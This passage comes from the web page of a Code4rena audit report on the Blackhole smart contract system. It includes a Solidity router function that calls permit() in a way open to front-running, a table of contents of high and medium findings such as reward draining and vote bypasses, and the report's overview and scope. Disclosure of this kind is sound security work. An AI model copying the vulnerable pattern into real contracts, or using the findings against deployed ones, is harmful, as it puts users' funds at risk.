invalidate user transactions.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"97\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address token,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        bool stable,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint liquidity,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint amountTokenMin,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint amountETHMin,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address to,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint deadline,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        bool approveMax, uint8 v, bytes32 r, bytes32 s\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ) external returns (uint amountToken, uint amountETH) { \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        address pair = pairFor(token, address(wETH), stable);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint value = approveMax ? type(uint).max : liquidity;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        IBaseV1Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        (amountToken, amountETH) = removeLiquidityETHSupportingFeeOnTransferTokens(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            token, stable, liquidity, amountTokenMin, amountETHMin, to, deadline\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch1 id=\"disclosures\" style=\"position:relative;\"\u003e\u003ca href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eDisclosures\u003c/h1\u003e\n\u003cp\u003eC4 is an open organization governed by participants in the community.\u003c/p\u003e\n\u003cp\u003eC4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\u003c/p\u003e\n\u003cp\u003eC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\u003c/p\u003e\n\u003cstyle class=\"grvsc-styles\"\u003e\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line \u003e * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting \u003e .grvsc-code \u003e .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .mtk6 { color: #D7BA7D; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n\u003c/style\u003e"])</script><script>self.__next_f.push([1,"16:T21bc,"])</script><script>self.__next_f.push([1,"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#overview\"\u003eOverview\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#about-c4\"\u003eAbout C4\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#summary\"\u003eSummary\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#governor-findings\"\u003eGovernor findings\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#scope\"\u003eScope\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#severity-criteria\"\u003eSeverity Criteria\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#high-risk-findings-2\"\u003eHigh Risk Findings (2)\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#h-01-router-address-validation-logic-error-prevents-valid-router-assignment\"\u003e[H-01] Router address validation logic error prevents valid router assignment\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#h-02-reward-token-in-gaugefactorycl-can-be-drained-by-anyone\"\u003e[H-02] Reward token in \u003ccode\u003eGaugeFactoryCL\u003c/code\u003e can be drained by anyone\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#medium-risk-findings-13\"\u003eMedium Risk Findings (13)\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#m-01-minterupgradeable-double-subtracting-smnft-burns-causes-rebase-underpayment\"\u003e[M-01] \u003ccode\u003eMinterUpgradeable\u003c/code\u003e: double-subtracting smNFT burns causes rebase underpayment\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-02-critical-access-control-flaw-role-removal-logic-incorrectly-grants-unauthorized-roles\"\u003e[M-02] Critical access control flaw: Role removal logic incorrectly grants unauthorized roles\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-03-1e10-fixed-farming-reward-in-gaugefactorycl\"\u003e[M-03] \u003ccode\u003e1e10\u003c/code\u003e fixed farming reward in \u003ccode\u003eGaugeFactoryCL\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-04-logic-error-in-avm-original-owner-resolution\"\u003e[M-04] Logic error in AVM original owner resolution\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-05-griefing-attack-on-genesispoolmanagersoldepositnativetoken-leading-to-denial-of-service\"\u003e[M-05] Griefing attack on \u003ccode\u003eGenesisPoolManager.sol::depositNativeToken\u003c/code\u003e leading to Denial of Service\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-06-first-liquidity-provider-can-dos-the-pool-of-a-stable-pair\"\u003e[M-06] First liquidity provider can DOS the pool of a stable pair\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-07-isgenesisflag-is-ineffective-to-control-add-liquidity-flow-in-routerv2addliquidity\"\u003e[M-07] \u003ccode\u003eisGenesis\u003c/code\u003e flag is ineffective to control add liquidity flow in \u003ccode\u003eRouterV2.addLiquidity()\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-08-function-return-variable-shadowing-prevents-storage-updates-in-solidity\"\u003e[M-08] Function return variable shadowing prevents storage updates in solidity\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-09-zero-receiver-fund-burn\"\u003e[M-09] Zero-receiver fund burn\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-10-erc-2612-permit-front-running-in-routerv2-enables-dos-of-liquidity-operations\"\u003e[M-10] ERC-2612 permit front-running in RouterV2 enables DoS of liquidity operations\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-11-incorrect-function-call-in-bribefactoryv3-recovererc20andupdatedata\"\u003e[M-11] Incorrect function call in \u003ccode\u003eBribeFactoryV3\u003c/code\u003e \u003ccode\u003erecoverERC20AndUpdateData\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-12-epoch-voting-restrictions-bypassed-via-deposit_for-for-blacklistednon-whitelisted-tokenids\"\u003e[M-12] Epoch voting restrictions bypassed via \u003ccode\u003edeposit_for()\u003c/code\u003e for blacklisted/non-whitelisted \u003ccode\u003etokenID\u003c/code\u003es\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-13-eip-712-domain-type-hash-mismatch-breaks-signature-based-delegation\"\u003e[M-13] EIP-712 domain type hash mismatch breaks signature-based delegation\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#governor\"\u003eGovernor\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#medium-risk-findings-9\"\u003eMedium Risk Findings (9)\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#m-14-checkpoints-are-incorrectly-cleared-during-transferfrom\"\u003e[M-14] Checkpoints are incorrectly cleared during \u003ccode\u003etransferFrom\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-15-l2governorexecute-accepts-expired--defeated-proposals-attacker-front-runs-blackgovernor-nudge-blocks-legitimate-emission-rate-votes-freezes-tail-emissions\"\u003e[M-15] \u003ccode\u003eL2Governor.execute()\u003c/code\u003e accepts \u003ccode\u003eExpired\u003c/code\u003e / \u003ccode\u003eDefeated\u003c/code\u003e proposals, attacker front-runs \u003ccode\u003eBlackGovernor\u003c/code\u003e \u003ccode\u003enudge()\u003c/code\u003e, blocks legitimate emission-rate votes, freezes tail emissions\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-16-getvotes-inside-the-blackgovernor-incorrectly-provides-blocknumber-instead-of-blocktimestamp-leading-to-complete-dos-of-proposal-functionality\"\u003e[M-16] \u003ccode\u003egetVotes\u003c/code\u003e inside the \u003ccode\u003eBlackGovernor\u003c/code\u003e incorrectly provides \u003ccode\u003eblock.number\u003c/code\u003e instead of \u003ccode\u003eblock.timestamp\u003c/code\u003e, leading to complete DOS of proposal functionality\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-17-users-can-cast-their-votes-multiple-times-for-the-proposal-by-transferring-their-nfts-and-then-voting-again\"\u003e[M-17] Users can cast their votes multiple times for the proposal by transferring their nfts and then voting again\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-18-status-does-not-update-inside-the-blackgovernor-leading-to-complete-distribution-of-nudge-functionality\"\u003e[M-18] Status does not update inside the \u003ccode\u003eBlackGovernor\u003c/code\u003e leading to complete distribution of nudge functionality\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-19-quorum-does-not-include-the-againstvotes-leading-to-emissions-rate-staying-the-same-even-if-it-should-decrease\"\u003e[M-19] Quorum does not include the \u003ccode\u003eagainstVotes\u003c/code\u003e leading to emissions rate staying the same even if it should decrease\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-20-getsmnftpastvotes-incorrectly-checks-for-voting-power-leading-to-some-nfts-incorrectly-being-eligible-to-vote\"\u003e[M-20] \u003ccode\u003egetsmNFTPastVotes\u003c/code\u003e incorrectly checks for Voting Power leading to some NFTs incorrectly being eligible to vote\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-21-governance-emission-adjustment-ignored-when-weekly-emission-above-tail-threshold\"\u003e[M-21] Governance emission adjustment ignored when weekly emission above tail threshold\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-22-governance-deadlock-potential-in-blackgovernorsol-due-to-quorum-mismatch\"\u003e[M-22] Governance deadlock potential in \u003ccode\u003eBlackGovernor.sol\u003c/code\u003e due to quorum mismatch\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#low-risk-and-non-critical-issues\"\u003eLow Risk and Non-Critical Issues\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#01-early-returning-in-_blacklist-and-blacklistconnector-function-prevents-emission-of-blacklisted-event-and-blacklistconnector-event-respectively\"\u003e01 Early returning in \u003ccode\u003e_blacklist()\u003c/code\u003e and \u003ccode\u003eblacklistConnector\u003c/code\u003e function prevents emission of blacklisted event and blacklistConnector event respectively\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#02-incomplete-implementation-of-purchased-function-in-auction-contract\"\u003e02 Incomplete implementation of \u003ccode\u003epurchased\u003c/code\u003e function in Auction contract\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#03-stack-too-deep-error-in-inline-assembly-variable-headstart\"\u003e03 Stack too deep error in inline assembly (variable \u003ccode\u003eheadStart\u003c/code\u003e)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#04-hardcoded-manager-lacks-ability-to-renounce-control\"\u003e04 Hardcoded manager lacks ability to renounce control\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#05-precision-loss-in-smnft-bonus-calculation-may-result-in-zero-bonus-when-updating-to-smnft\"\u003e05 Precision loss in smNFT bonus calculation may result in zero bonus when updating to smNFT\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#06-getvotes-wiew-function-becomes-unusable-when-a-user-owns-too-many-locks\"\u003e06 \u003ccode\u003egetVotes()\u003c/code\u003e wiew function becomes unusable when a user owns too many locks\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#07-distributeall-function-at-risk-of-repeated-failure-due-to-unbounded-loop-over-gauges\"\u003e07 \u003ccode\u003edistributeAll()\u003c/code\u003e function at risk of repeated failure due to unbounded loop over gauges\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#08-fee-recipient-may-remain-set-to-previous-owner\"\u003e08 Fee recipient may remain set to previous owner\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#09-incorrect-setrouter-function-only-allows-zero-address-to-pass\"\u003e09 Incorrect \u003ccode\u003esetRouter\u003c/code\u003e function only allows zero address to pass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#10-misaligned-access-control-on-settopnpools-function\"\u003e10 Misaligned access control on \u003ccode\u003esetTopNPools()\u003c/code\u003e function\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#11-governancecentralization-risks-21-contracts-covered\"\u003e11 Governance/centralization Risks (21 contracts covered)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#12-function-declaration-does-not-follow-solidity-style-guide-at-fixedauctionsol\"\u003e12 Function declaration does not follow Solidity style guide at \u003ccode\u003eFixedAuction.sol\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#13-incorrect-require-statement-for-address-check-at-gaugev2sol\"\u003e13 Incorrect require statement for address check at \u003ccode\u003eGaugeV2.sol\u003c/code\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"#mitigation-review\"\u003eMitigation Review\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#mitigation-review-scope--summary\"\u003eMitigation Review Scope \u0026#x26; Summary\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-05-unmitigated\"\u003e[M-05] Unmitigated\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#m-10-unmitigated\"\u003e[M-10] Unmitigated\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#disclosures\"\u003eDisclosures\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e"])</script><script>self.__next_f.push([1,"19:Te52f9,"])</script><script>self.__next_f.push([1,"\u003ch1 id=\"overview\" style=\"position:relative;\"\u003e\u003ca href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eOverview\u003c/h1\u003e\n\u003ch2 id=\"about-c4\" style=\"position:relative;\"\u003e\u003ca href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eAbout C4\u003c/h2\u003e\n\u003cp\u003eCode4rena (C4) is a competitive audit platform where security researchers, referred to as Wardens, review, audit, and analyze codebases for security vulnerabilities in exchange for bounties provided by sponsoring projects.\u003c/p\u003e\n\u003cp\u003eA C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\u003c/p\u003e\n\u003cp\u003eDuring the audit outlined in this document, C4 conducted an analysis of the Blackhole smart contract system. The audit took place from May 28 to June 09, 2025.\u003c/p\u003e\n\u003cp\u003eFollowing the C4 audit, 3 wardens (\u003ca href=\"https://code4rena.com/@rayss\"\u003erayss\u003c/a\u003e, \u003ca href=\"https://code4rena.com/@lonelybones\"\u003elonelybones\u003c/a\u003e and \u003ca href=\"https://code4rena.com/@maxzuvex\"\u003emaxzuvex\u003c/a\u003e) reviewed the mitigations for all identified issues; the \u003ca href=\"#mitigation-review\"\u003emitigation review report\u003c/a\u003e is appended below the audit report.\u003c/p\u003e\n\u003cp\u003eFinal report assembled by Code4rena.\u003c/p\u003e\n\u003ch1 id=\"summary\" style=\"position:relative;\"\u003e\u003ca href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSummary\u003c/h1\u003e\n\u003cp\u003eThe C4 analysis yielded an aggregated total of 24 unique vulnerabilities. Of these vulnerabilities, 2 received a risk rating in the category of HIGH severity and 22 received a risk rating in the category of MEDIUM severity.\u003c/p\u003e\n\u003cp\u003eAdditionally, C4 analysis included 13 reports detailing issues with a risk rating of LOW severity or non-critical. \u003c/p\u003e\n\u003cp\u003eAll of the issues presented here are linked back to their original finding, which may include relevant context from the judge and Blackhole team.\u003c/p\u003e\n\u003ch2 id=\"governor-findings\" style=\"position:relative;\"\u003e\u003ca href=\"#governor-findings\" aria-label=\"governor findings permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eGovernor findings\u003c/h2\u003e\n\u003cp\u003eOf the identified vulnerabilities, 5 medium severity findings were associated with the Governor contracts.\u003c/p\u003e\n\u003cp\u003e⚠️ The Blackhole team has decided not to deploy a governor contract at this time. \u003c/p\u003e\n\u003cp\u003eThe sponsors have requested the following note be included:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eBlackhole has chosen not to deploy a governor contract at this stage. A more advanced version will be introduced later as per the roadmap, subject to a separate audit.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eC4 has included the related findings as a \u003ca href=\"#governor\"\u003eseparate section\u003c/a\u003e in this report. Original numbering is in continuous order for this section, for ease of reference.\u003c/p\u003e\n\u003ch1 id=\"scope\" style=\"position:relative;\"\u003e\u003ca href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eScope\u003c/h1\u003e\n\u003cp\u003eThe code under review can be found within the \u003ca href=\"https://github.com/code-423n4/2025-05-audit-507\"\u003eC4 Blackhole repository\u003c/a\u003e, and is composed of 116 smart contracts written in the Solidity programming language and includes 10,108 lines of Solidity code.\u003c/p\u003e\n\u003ch1 id=\"severity-criteria\" style=\"position:relative;\"\u003e\u003ca href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSeverity Criteria\u003c/h1\u003e\n\u003cp\u003eC4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.\u003c/p\u003e\n\u003cp\u003eHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMalicious Input Handling\u003c/li\u003e\n\u003cli\u003eEscalation of privileges\u003c/li\u003e\n\u003cli\u003eArithmetic\u003c/li\u003e\n\u003cli\u003eGas use\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eFor more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on \u003ca 